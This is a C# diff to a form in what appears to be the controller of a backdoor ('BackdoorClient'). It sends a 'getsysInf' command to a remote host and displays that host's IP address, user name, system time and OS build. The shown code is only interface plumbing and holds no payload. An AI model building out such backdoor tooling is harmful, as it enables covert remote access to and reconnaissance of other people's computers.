@@ -6,19 +6,27 @@ namespace BackdoorClient
 {
     public partial class SystemInf : Form
     {
-        public SystemInf()
+        public Form1 mainForm;
+
+        public SystemInf(Form1 f)
         {
+            mainForm = f;
             InitializeComponent();
+        }
+
+        private void SystemInf_Load(object sender, EventArgs e)
+        {
+            UpdateParameters();
         }
 
         private void updateBut_Click(object sender, EventArgs e)
         {
-           
+            UpdateParameters();
         }
 
-        private void GetUpdateParameters()
+        private void UpdateParameters()
         {
-            var docContent = "";
+            var docContent = mainForm.SendCommandAndGetResponce("getsysInf $true");
             XmlDocument doc = new XmlDocument();
             doc.LoadXml(docContent);
 
@@ -50,12 +58,12 @@ namespace BackdoorClient
                         textSys = root.ChildNodes[i].InnerText;
                 }
             }
-            ipAddrLabel.Text = textIP;
-            SystemTimeLabel.Text = textTime;
+            ipAddrLabel.Text = "Ip аддрес: " + textIP;
+            SystemTimeLabel.Text = "Системное время: " + textTime;
             SysNameLabel.Text = "";
-            usNameLabel.Text = textUsName;
-            numBuildLabel.Text = textBuildNum;
-            SysNameLabel.Text = textSys;
+            usNameLabel.Text = "Пользователь: " + textUsName;
+            numBuildLabel.Text = "Номер билда: " + textBuildNum;
+            SysNameLabel.Text = "Система: " + textSys;
         }
     }
 }
